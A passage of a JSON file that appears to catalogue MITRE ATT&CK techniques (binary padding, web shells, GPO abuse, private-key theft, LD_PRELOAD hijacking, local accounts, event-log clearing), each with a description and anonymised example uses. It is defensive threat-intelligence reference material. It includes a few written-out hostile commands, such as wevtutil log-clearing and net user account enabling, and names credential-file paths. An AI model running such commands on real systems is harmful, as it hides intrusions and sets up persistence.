      "has used random junk code to obfuscate malware code.",
      "can use large obfuscated libraries to hinder detection and analysis.",
      "can use large file sizes to evade detection.",
      "has added four additional bytes of data upon launching then saved the changed version as C:\\ProgramData\\Initech\\Initech.exe.",
      "has obfuscated .NET executables by inserting junk code.",
      "contains junk code in its binary likely to confuse malware analysts.",
      "has inserted garbage characters into code presumably to avoid anti-virus detection.",
      "has obfuscated DLLs and functions using dummy API calls inserted between real instructions.",
      "has used garbage code to pad some of its malware components.",
      "has added BMP images to the resources section of its Portable Executable (PE) file increasing each binary to at least 300MB in size.",
      "used large size files to avoid detection by security solutions with hardcoded size limits.",
      "has been known to employ binary padding.",
      "has added the entire unobfuscated code of the legitimate open source application Blink to its code.",
      "has appended random binary data to the end of itself to generate a large binary.",
      "performed padding with null bytes before calculating its hash.",
      "contains junk code to increase its entropy and hide the actual code.",
      "Before writing to disk  inserts a randomly generated string into the middle of the decrypted payload in an attempt to evade hash-based detections.",
      "contains unused machine instructions in a likely attempt to hinder analysis.",
      "contains junk code in its functions in an effort to confuse disassembly programs.",
      "had added data prior to the Portable Executable (PE) header to prevent automatic scanners from identifying the payload.",
      "apparently altered  samples by adding four bytes of random letters in a likely attempt to change the file hashes.",
      "has added extra spaces between JavaScript code characters to increase the overall file size.",
      "downloader code has included 0 characters at the end of the file to inflate the file size in a likely attempt to evade anti-virus detection.",
      "A variant of  appends junk data to the end of its DLL file to create a large file that may exceed the maximum size that anti-virus programs can scan.",
      "includes garbage code to mislead anti-malware software and researchers.",
      "has used junk code within their DLL files to hinder analysis.",
      "can use junk code to hide functions and evade detection.",
      "appends a total of 64MB of garbage data to a file to deter any security products in place that may be scanning files on disk.",
      "has used useless code blocks to counter analysis.",
      "has been packed with junk code and strings.",
      "has the ability to add bytes to change the file hash.",
      "can obfuscate strings using junk Chinese characters.",
      "has had null characters padded in its malicious DLL payload.",
      "inflates malicious files and malware as an evasion technique.",
      "The  installer has been padded with null bytes to inflate its size.",
      "has been obfuscated with a 129 byte sequence of junk data prepended to the file.",
      "configuration file is appended to the end of the binary. For example the last `0x1d0` bytes of one sample is an AES encrypted configuration file with a static key of `3e2717e8b3873b29`.",
      "has used binary padding to obfuscate payloads."
    ],
    "description": "Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.(Citation: ESET OceanLotus) The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.(Citation: Securelist Malware Tricks April 2017) Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal FAQ) ",
    "similar_words": [
      "Binary Padding"
    ],
    "id": "T1027.001"
  },
  "attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb": {
    "name": "Web Shell",
    "example_uses": [
      "can gain remote access and execution on target web servers.",
      "is a Web shell that appears to be exclusively used by . It is installed as an ISAPI filter on Exchange servers and shares characteristics with the  Web shell.",
      "has commonly created Web shells on victims' publicly accessible email and web servers which they used to maintain access to a victim network and download additional malicious files.",
      "has used a modified and obfuscated version of the reGeorg web shell to maintain persistence on a target's Outlook Web Access (OWA) server.",
      "is a web shell that can download files to and execute arbitrary commands from compromised Ivanti Connect Secure VPNs.",
      "has used web shells often to maintain access to a victim network.",
      "has utilized obfuscated and open-source web shells such as JspSpy reGeorg MiniWebCmdShell and Vonloesch Jsp File Browser 1.2 to enable remote code execution and to execute commands on compromised web server.",
      "has used web shells to establish an initial foothold and for lateral movement within a victim's system.",
      "is a web shell that has the ability to execute arbitrary commands or write files.",
      "is a web shell that can read write and execute files on compromised servers.",
      "is a web shell capable of command execution and establishing persistence on compromised Ivanti Secure Connect VPNs.",
      "uses Web shells on publicly accessible Web servers to access victim networks.",
      "During   deployed JScript web shells through the creation of malicious ViewState objects.",
      "During the   deployed the Neo-REGEORGwebshell on an internet-facing server.",
      "During the  campaign  planted Web shells on Outlook Exchange servers.",
      "has installed ANTAK and ASPXSPY web shells.",
      "can inject web shell code into a server.",
      "used Web shells to persist in victim environments and assist in execution and exfiltration.",
      "During  threat actors used multiple web shells to maintain presence on compromised Connect Secure appliances such as     and .",
      "is a web shell that can enable the execution of arbitrary commands on compromised web servers.",
      "has used a variety of Web shells.",
      "is a Web shell. The ASPXTool version used by  has been deployed to accessible servers running Internet Information Services (IIS).",
      "has started a web service in the target host and wait for the adversary to connect acting as a web shell.",
      "has deployed multiple web shells on compromised servers including SIMPLESEESHARP SPORTSBALL  and .",
      "is a web shell that can enable command execution on compromised servers.",
      "has dropped a web shell onto a compromised system.",
      "has used webshells including  to maintain access to victim networks.",
      "is a web shell capable of enabling arbitrary command execution on compromised Ivanti Connect Secure VPNs.",
      "is a web shell that is capable of arbitrary file read on targeted web servers to exfiltrate items of interest on the victim device.",
      "has installed web shells on compromised hosts to maintain access.",
      "has used a first stage web shell after compromising a vulnerable Exchange server.",
      "has used webshells including ones named AuditReport.jspx and iisstart.aspx in compromised environments.",
      "has used web shells for persistence or to ensure redundant access.",
      "has installed web shells on exploited Microsoft Exchange servers.",
      "During  the threat actors generated a web shell within a vulnerable Enterprise Resource Planning Web Application Server as a persistence mechanism.",
      "is a Web shell.",
      "has used multiple web shells to gain execution.",
      "is a Web shell.",
      "server component is a Web Shell payload.",
      "is a web shell capable of tunneling C2 connections and code execution on compromised Ivanti Secure Connect VPNs.",
      "has installed multiple web shells on compromised servers including on Pulse Secure VPN appliances.",
      "has used Web shells to maintain access to victim websites.",
      "relies on web shells for an initial foothold as well as persistence into the victim's systems.",
      "During  threat actors used their own web shells as well as those previously placed on target systems by other threat actors for reconnaissance and lateral movement.",
      "has used modified versions of open source PHP web shells to maintain access often adding Dinosaur references within the code.",
      "has been linked to web shells following likely server compromise as an initial access vector into victim networks.",
      "typically deploys a variant of the  web shell following initial access via exploitation.",
      "involved use of web shells such as ANTSWORD and BLUEBEAM for persistence.",
      "deploys web shells following initial access for either follow-on command execution or protocol tunneling. Example web shells used by  include P0wnyshell reGeorg  and custom variants of publicly-available web shell examples.",
      "For  threat actors used .aspx webshells named pickers.aspx error4.aspx and ClientBin.aspx to maintain persistence.",
      "resulted in the deployment of the VersaMem web shell for follow-on activity.",
      "deployed a ReGeorg variant web shell to impacted systems following initial access for persistence.",
      "can be installed on compromised web servers to tunnel C2 connections.",
      "is a persistent Lua-based web shell.",
      "relied extensively on web shell use following initial access for persistence and command execution purposes in victim environments during .",
      "is a reverse TCP shell with command and control capabilities used for persistence purposes.",
      "has used ASPX web shells following exploitation of vulnerabilities in services such as Microsoft Exchange.",
      "is a web shell that has been installed on exposed web servers for access to victim environments.",
      "deployed the  web shell during intrusion operations."
    ],
    "description": "Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.(Citation: volexity_0day_sophos_FW)In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).(Citation: Lee 2013)",
    "similar_words": [
      "Web Shell"
    ],
    "id": "T1505.003"
  },
  "attack-pattern--5d2be8b9-d24c-4e98-83bf-2f5f79477163": {
    "name": "Group Policy Modification",
    "example_uses": [
      "has been deployed using the Default Domain Group Policy Object from an Active Directory Domain Controller.",
      "has the ability to deploy through an infected system's default domain policy.",
      "has used Group Policy to deploy batch scripts for ransomware deployment.",
      "can use New-GPOImmediateTask to modify a GPO that will install and execute a malicious .",
      "has used Group Policy Objects to deploy batch scripts.",
      "can modify the GPO to evade detection.",
      "can use group policy to push a scheduled task from the AD to all network machines.",
      "During the   leveraged Group Policy Objects (GPOs) to deploy and execute malware.",
      "used scheduled tasks created via Group Policy Objects (GPOs) to deploy ransomware.",
      "can enable options for propogation through Group Policy Objects.",
      "can modify Group Policy to disable Windows Defender and to automatically infect devices in Windows domains."
    ],
    "description": "Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) Like other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.Malicious GPO modifications can be used to implement many other malicious behaviors such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001), [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Create Account](https://attack.mitre.org/techniques/T1136), [Service Execution](https://attack.mitre.org/techniques/T1569/002),  and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs)For example, publicly available scripts such as New-GPOImmediateTask can be leveraged to automate the creation of a malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) by modifying GPO settings, in this case modifying &lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml.(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in &lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)",
    "similar_words": [
      "Group Policy Modification"
    ],
    "id": "T1484.001"
  },
  "attack-pattern--60b508a1-6a5e-46b1-821a-9f7b78752abf": {
    "name": "Private Keys",
    "example_uses": [
      "has scanned and looked for cryptographic keys and certificate file extensions.",
      "CRYPTO::Extract module can extract keys by interacting with Windows cryptographic application programming interface (API) functions.",
      "During  threat actors used  to dump certificates and private keys from the Windows certificate store.",
      "has searched for private keys.",
      "has searched for private keys in .ssh.",
      "can collect a Chrome encryption key used to protect browser cookies.",
      "enumerate and exfiltrate code-signing certificates from a compromised host.",
      "During the   obtained PKI keys certificate files and the private encryption key from an Active Directory Federation Services (AD FS) container to decrypt corresponding SAML signing certificates.",
      "can retrieve token signing certificates and token decryption certificates from a compromised AD FS server.",
      "has searched for unsecured SSH keys.",
      "can use modules like Invoke-SessionGopher to extract private key and session information.",
      "can gather encryption keys from Azure AD services such as ADSync and Active Directory Federated Services servers.",
      "has used SSH private keys on the infected machine to spread its coinminer throughout a network.",
      "has intercepted unencrypted private keys as well as private key pass-phrases.",
      "can steal keys for VPNs and cryptocurrency wallets.",
      "has accessed a Local State file that contains the AES key used to encrypt passwords stored in the Chrome browser.",
      "collects all data in victim `.ssh` folders by creating a compressed copy that is subsequently exfiltrated to command and control infrastructure.  also collects key information associated with the Government Public Key Infrastructure (GPKI) service for South Korean government information systems."
    ],
    "description": "Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. Adversaries may also look in common key directories, such as ~/.ssh for SSH keys on * nix-based systems or C:&#92;Users&#92;(username)&#92;.ssh&#92; on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation: Palo Alto Prince of Persia)When a device is registered to Entra ID, a device key and a transport key are generated and used to verify the devices identity.(Citation: Microsoft Primary Refresh Token) An adversary with access to the device may be able to export the keys in order to impersonate the device.(Citation: AADInternals Azure AD Device Identities)On network devices, private keys may be exported via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `crypto pki export`.(Citation: cisco_deploy_rsa_keys) Some private keys require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line. These private keys can be used to authenticate to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email.",
    "similar_words": [
      "Private Keys"
    ],
    "id": "T1552.004"
  },
  "attack-pattern--60c4b628-4807-4b0b-bbf5-fdac8643c337": {
    "name": "Server",
    "example_uses": [
      "During   acquired servers to host their malicious tools.",
      "has used Taiwan-based servers that appear to be exclusive to .",
      "has purchased hosting servers with virtual currency and prepaid cards.",
      "For  the threat actors purchased servers with Bitcoin to use during the operation.",
      "has leased servers from resellers instead of leasing infrastructure directly from hosting companies to enable its operations.",
      "During  threat actors purchased hosted services to use for C2.",
      "For  at least one identified persona was used to register for a free account for a control server.",
      "has acquired multiple servers for some of their operations using each server for a different role.",
      "has acquired servers to host second-stage payloads that remain active for a period of either days weeks or months.",
      "has created dedicated servers for command and control and exfiltration purposes."
    ],
    "description": "Adversaries may buy, lease, rent, or obtain physical serversthat can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, such as watering hole operations in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), enabling [Phishing](https://attack.mitre.org/techniques/T1566) operations, or facilitating [Command and Control](https://attack.mitre.org/tactics/TA0011). Instead of compromising a third-party [Server](https://attack.mitre.org/techniques/T1584/004) or renting a [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may opt to configure and run their own servers in support of operations. Free trial periods of cloud servers may also be abused.(Citation: Free Trial PurpleUrchin)(Citation: Freejacked) Adversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.(Citation: NYTStuxnet)",
    "similar_words": [
      "Server"
    ],
    "id": "T1583.004"
  },
  "attack-pattern--60d0c01d-e2bf-49dd-a453-f8a9c9fa6f65": {
    "name": "Windows Remote Management",
    "example_uses": [
      "has leveraged `WMI` to move laterally within a compromised network via application servers and SQL servers.",
      "can use WinRM for pivoting.",
      "has used WinRM for lateral movement.",
      "During the   used WinRM via PowerShell to execute commands and payloads on remote hosts.",
      "can use WinRM to execute a payload on a remote host.",
      "tracks `TrustedHosts` and can move laterally to these targets via WinRM.",
      "has used WinRM to enable remote execution.",
      "has used Window Remote Management to move laterally through a victim network.",
      "During  threat actors used WinRM to move laterally in targeted networks."
    ],
    "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.WinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).(Citation: Microsoft WinRM) It may be called with the `winrm` command or by any number of programs such as PowerShell.(Citation: Jacobsen 2014) WinRM  can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).(Citation: MSDN WMI)",
    "similar_words": [
      "Windows Remote Management"
    ],
    "id": "T1021.006"
  },
  "attack-pattern--613d08bc-e8f4-4791-80b0-c8b974340dfd": {
    "name": "Exfiltration Over Bluetooth",
    "example_uses": [
      "has a module named BeetleJuice that contains Bluetooth functionality that may be used in different ways including transmitting encoded information from the infected system over the Bluetooth protocol acting as a Bluetooth beacon and identifying other Bluetooth devices in the vicinity."
    ],
    "description": "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.Adversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
    "similar_words": [
      "Exfiltration Over Bluetooth"
    ],
    "id": "T1011.001"
  },
  "attack-pattern--6151cbea-819b-455a-9fa6-99a1cc58797d": {
    "name": "Default Accounts",
    "example_uses": [
      "has leveraged default credentials for authenticating myWebMethods (WMS) and QLogic web management interface to gain initial access.",
      "can use default credentials to connect to IPC$ shares on remote machines.",
      "enabled and used the default system managed account DefaultAccount via `powershell.exe /c net user DefaultAccount /active:yes` to connect to a targeted Exchange server over RDP.",
      "infected WinCC machines via a hardcoded database server password.",
      "During  threat actors used the built-in administrator account to move laterally using RDP and .",
      "has abused default user names and passwords in externally-accessible IP cameras for initial access."
    ],
    "description": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS, the root user account in ESXi, and the default service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix for Kubernetes)Default accounts are not limited to client machines; rather, they also include accounts that are preset for equipment such as network devices and computer applications, whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module)Default accounts may be created on a system after initial setup by connecting or integrating it with another application. For example, when an ESXi server is connected to a vCenter server, a default privileged account called `vpxuser` is created on the ESXi server. If a threat actor is able to compromise this accounts credentials (for example, via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212) on the vCenter host), they will then have access to the ESXi server.(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(Citation: Pentera vCenter Information Disclosure)",
    "similar_words": [
      "Default Accounts"
    ],
    "id": "T1078.001"
  },
  "attack-pattern--61afc315-860c-4364-825d-0d62b2e91edc": {
    "name": "Time Providers",
    "example_uses": [],
    "description": "Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.(Citation: Microsoft TimeProvider)Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of `HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\`.(Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.(Citation: Microsoft TimeProvider)Adversaries may abuse this architecture to establish persistence, specifically by creating a new arbitrarily named subkey  pointing to a malicious DLL in the `DllName` value. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.(Citation: Github W32Time Oct 2017)",
    "similar_words": [
      "Time Providers"
    ],
    "id": "T1547.003"
  },
  "attack-pattern--63220765-d418-44de-8fae-694b3912317d": {
    "name": "Trap",
    "example_uses": [],
    "description": "Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The trap command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like ctrl+c and ctrl+d.Adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format trap 'command list' signals where \"command list\" will be executed when \"signals\" are received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements)",
    "similar_words": [
      "Trap"
    ],
    "id": "T1546.005"
  },
  "attack-pattern--633a100c-b2c9-41bf-9be5-905c1b16c825": {
    "name": "Dynamic Linker Hijacking",
    "example_uses": [
      "has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists.",
      "has modified /etc/ld.so.preload to intercept shared library import functions.",
      "adds itself as a shared object to the LD_PRELOAD environment variable.",
      "adds malicious file paths to the DYLD_FRAMEWORK_PATH and DYLD_LIBRARY_PATH environment variables to execute malicious code.",
      "has configured payloads to load via LD_PRELOAD.",
      "copies the malicious file /data2/.bd.key/preload.so to /lib/preload.so then launches a child process that executes the malicious file /data2/.bd.key/authd as /bin/authd with the arguments /lib/preload.so reboot newreboot 1. This injects the malicious preload.so file into the process with PID 1 and replaces its reboot function with the malicious newreboot function for persistence.",
      "has injected its dynamic library into descendent processes of sshd via LD_PRELOAD.",
      "modified the ld.so preload file in Linux environments to enable persistence for Winnti malware.",
      "When  is running as an OpenSSH server it uses LD_PRELOAD to inject its malicious shared module in to programs launched by SSH sessions.  hooks the following functions from `libc` to inject into subprocesses; `system` `popen` `execve` `execvpe` `execv` `execvp` and `execl`."
    ],
    "description": "Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from various environment variables and files, such as LD_PRELOAD on Linux or DYLD_INSERT_LIBRARIES on macOS.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) Each platform's linker uses an extensive list of environment variables at different points in execution. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions in the original library.(Citation: Baeldung LD_PRELOAD)Hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. On Linux, adversaries may set LD_PRELOAD to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. For example, adversaries have used `LD_PRELOAD` to inject a malicious library into every descendant process of the `sshd` daemon, resulting in execution under a legitimate process. When the executing sub-process calls the `execve` function, for example, the malicious librarys `execve` function is executed rather than the system function `execve` contained in the system library on disk. This allows adversaries to [Hide Artifacts](https://attack.mitre.org/techniques/T1564) from detection, as hooking system functions such as `execve` and `readdir` enables malware to scrub its own artifacts from the results of commands such as `ls`, `ldd`, `iptables`, and `dmesg`.(Citation: ESET Ebury Oct 2017)(Citation: Intezer Symbiote 2022)(Citation: Elastic Security Labs Pumakit 2024)Hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges.",
    "similar_words": [
      "Dynamic Linker Hijacking"
    ],
    "id": "T1574.006"
  },
  "attack-pattern--635cbe30-392d-4e27-978e-66774357c762": {
    "name": "Local Account",
    "example_uses": [
      "has created local administrator accounts to maintain persistence in compromised networks.",
      "has created Local Administrator accounts to maintain access to systems with short-cycle credential rotation.",
      "creates a user account as a means to provide initial persistence to the compromised machine.",
      "can create new users on an infected system.",
      "has a module for creating a local user if permissions allow.",
      "has created accounts on victims including administrator accounts some of which appeared to be tailored to each individual staging target.",
      "has created local privileged users on victim machines.",
      "has created a local user account with administrator privileges.",
      "has created user accounts.",
      "has created user accounts.",
      "has created MS-SQL local accounts in a compromised network.",
      "can create backdoor accounts with login HelpAssistant on domain connected systems if appropriate rights are available.",
      "has created a new user named supportaccount.",
      "has created accounts with net user.",
      "can user PowerView to execute net user commands and create local system accounts.",
      "may create a temporary user on the system named `Lost_{Unique Identifier}` with the password `pond~!@6{Unique Identifier}`.",
      "The net user username \\password commands in  can be used to create a local account.",
      "creates a local user account SafeMode via net user commands.",
      "may create a temporary user on the system named `Lost_{Unique Identifier}`.",
      "has created local accounts named `help` and `DefaultAccount` on compromised machines.",
      "can create a Windows account.",
      "used a tool called Imecab to set up a persistent remote access account on the victim machine.",
      "has created accounts on multiple compromised hosts to perform actions within the network.",
      "has created a user named monerodaemon.",
      "has a feature to create local user accounts.",
      "has been known to create or enable accounts such as support_388945a0.",
      "has the capability to add its own account to the victim's machine.",
      "has created local system accounts and has added the accounts to privileged groups.",
      "created a local account on victim machines to maintain access."
    ],
    "description": "Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. For example, with a sufficient level of access, the Windows net user /add command can be used to create a local account.  In Linux, the `useradd` command can be used, while on macOS systems, the dscl -create command can be used. Local accounts may also be added to network devices, often via common [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as username, to ESXi servers via `esxcli system account add`, or to Kubernetes clusters using the `kubectl` utility.(Citation: cisco_username_cmd)(Citation: Kubernetes Service Accounts Security)Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
    "similar_words": [
      "Local Account"
    ],
    "id": "T1136.001"
  },
  "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2": {
    "name": "Clear Windows Event Logs",
    "example_uses": [
      "can use  to remove Security System and Application Event Viewer logs.",
      "has cleared logs during post compromise cleanup activities.",
      "clears event logs.",
      "uses wevtutil to clear the Windows event logs.",
      "can delete Windows Event logs by invoking the `OpenEventLogW` and `ClearEventLogW` functions.",
      "can be used to clear system and security event logs from the system.",
      "has cleared event logs on compromised hosts.",
      "has cleared event logs including by using the commands wevtutil cl System and wevtutil cl Security.",
      "attempted to remove evidence of some of its activity by clearing Windows security and system events.",
      "can clear and remove event logs.",
      "will attempt to clear the System and Security event logs using wevtutil.",
      "has used  to empty log files.",
      "clears Window Event logs and Sysmon logs from the system.",
      "has cleared Windows event logs and other logs produced by tools they used including system security terminal services remote services and audit logs. The actors also deleted specific Registry keys.",
      "clears the system event logs using OpenEventLog/ClearEventLog APIs .",
      "can clear Windows event logs using `wevtutil.exe`.",
      "has a command to clear system event logs.",
      "has the ability to use `wevtutil cl system` to clear event logs.",
      "has cleared select event log entries.",
      "deletes Application Security Setup and System Windows Event Logs.",
      "has cleared event logs from victims.",
      "is able to wipe event logs.",
      "creates a backdoor through which remote attackers can clear all system event logs.",
      "has a module to clear event logs with PowerShell.",
      "contains code to clear event logs.",
      "The  component KillDisk is capable of deleting Windows Event Logs.",
      "During  the threat actors deleted all Windows system and security event logs using `/Q /c wevtutil cl system` and `/Q /c wevtutil cl security`.",
      "can overwrite the `C:\\Windows\\System32\\winevt\\Logs` file on a targeted system.",
      "has selectively cleared Windows Event Logs system logs and other technical artifacts to remove evidence of intrusion activity.",
      "clears Windows Event Logs following activity to evade defenses.",
      "has used  to empty log files. Additionally  has cleared all event logs using `wevutil`.",
      "removes Windows event logs during execution.",
      "can delete infected system log information.",
      "will attempt to delete all event logs on a victim machine following file wipe activity.",
      "has used tools to remove log files on targeted systems.",
      "can delete log files on targeted systems.",
      "can delete events from the Security System and Application logs.",
      "calls  to clear the Windows PowerShell and Microsoft-Windows-Powershell/Operational logs.",
      "can delete log files through the use of wevtutil.",
      "has cleared actor-performed actions from logs."
    ],
    "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.With administrator privileges, the event logs can be cleared with the following utility commands:* wevtutil cl system* wevtutil cl application* wevtutil cl securityThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command Remove-EventLog -LogName Security to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)Adversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
    "similar_words": [
      "Clear Windows Event Logs"
    ],
    "id": "T1070.001"
  },
  "attack-pattern--65013dd2-bc61-43e3-afb5-a14c4fa7437a": {
    "name": "Email Accounts",
    "example_uses": [
      "During  attackers created email addresses to register for a free account for a control server used for the implants.",
      "has created email accounts for phishing operations.",
      "has established email accounts using fake personas for spearphishing operations.",
      "For  the threat actors registered email accounts to use during the campaign.",
      "During   created fake email accounts to correspond with fake LinkedIn personas;  also established email accounts to match those of the victim as part of their BEC attempt.",
      "has leveraged the legitimate email marketing service SMTP2Go for phishing campaigns.",
      "has created new email accounts for targeting efforts.",
      "has established e-mail accounts to receive e-mails forwarded from compromised accounts.",
      "has created e-mail accounts to spoof targeted organizations.",
      "has created email accounts for later use in social engineering phishing and when registering domains.",
      "has leveraged ProtonMail email addresses in ransom notes when delivering  ransomware.",
      "has established email accounts for use in domain registration including for ProtonMail addresses.",
      "has created email accounts to communicate with their ransomware victims to include providing payment and decryption details.",
      "has created email accounts that mimic legitimate organizations for its spearphishing operations.",
      "For  the threat actors likely established an identified email account to register a variety of domains that were used during the campaign.",
      "For  the threat actors established email addresses to register domains for their operations.",
      "has created new email accounts for spearphishing operations.",
      "has created email accounts to interact with victims including for phishing purposes.",
      "has registered impersonation email accounts to spoof experts in a particular field or individuals and organizations affiliated with the intended target.",
      "has created dedicated email accounts for use with tools such as .",
      "has created email accounts to use in spearphishing operations."
    ],
